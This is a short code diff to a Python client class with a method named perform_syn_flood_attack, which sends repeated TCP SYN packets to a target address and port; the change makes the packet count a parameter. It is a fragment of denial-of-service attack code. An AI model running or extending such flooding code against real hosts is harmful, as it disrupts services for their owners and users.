@@ -55,9 +55,9 @@ class Client:
         tcp_packet.window = window_size
         send(ip_packet / tcp_packet, verbose=0)
 
-    def perform_syn_flood_attack(self, target_address: str, target_port: int):
+    def perform_syn_flood_attack(self, target_address: str, target_port: int, number_of_packets: int = NUMBER_OF_PACKETS):
         successful_requests = 0
-        for packet in range(NUMBER_OF_PACKETS):
+        for packet in range(number_of_packets):
             try:
                 self.__send_syn_packet(target_address, target_port)
                 successful_requests += 1
